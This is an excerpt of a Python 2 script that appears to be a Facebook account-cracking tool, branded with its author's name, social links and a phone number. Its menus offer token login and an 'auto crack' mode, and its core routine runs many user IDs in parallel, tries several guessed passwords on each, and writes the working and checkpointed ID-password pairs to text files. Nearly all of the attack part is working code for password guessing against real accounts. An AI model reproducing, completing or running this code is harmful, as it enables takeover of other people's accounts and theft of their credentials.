...
clear= """)
print("""\033[1;97m  L E G E N D -- Aneel .X. khan. \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;94m➤\033[1;97m Author : Mr-ERROR
\033[1;92m➤\033[1;97m Github : Aneelkhan529
\033[1;93m➤\033[1;97m Facebook : Aneel Kahn
\033[1;95m➤\033[1;97m Whatsapp : 03209075607
\033[1;97m  --------------------------------------------------""")   
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Aneelkhan529/Mr-ERROR/main/robot.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923209075607')
        reg()
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] Follow Aneel Kahn On Fb'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─-Aneel➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://facebook.com/Aneel kahn/')
    else:
        print ''
...
def menu():
    ...
    print '\033[1;92m[2] Follow Aneel kahn'
...
def menu_s():
    ms = raw_input('\033[1;97m╰─Mr-ERROR➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('xdg-open https://facebook.com/Aneelkahn/')
    elif ms == '3':
        v_tok()
    elif ms == '4':
        lout()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─Mr-Error➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[ANEEL-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/ANEEL_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[ANEEL-CP]➤ ' + uid + ' | ' + pass1
                cp = open('ANEEL_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[ANEEL-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/ANEEL_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[ANEEL-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('ANEEL_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[ANEEL-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/ANEEL_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[ANEEL-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('ANEEL_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[ANEEN-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/ANEEL_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[ANEEL-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('ANEEL_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mBAAKI NAAME TO SONAA HOGA [ANEEL]'
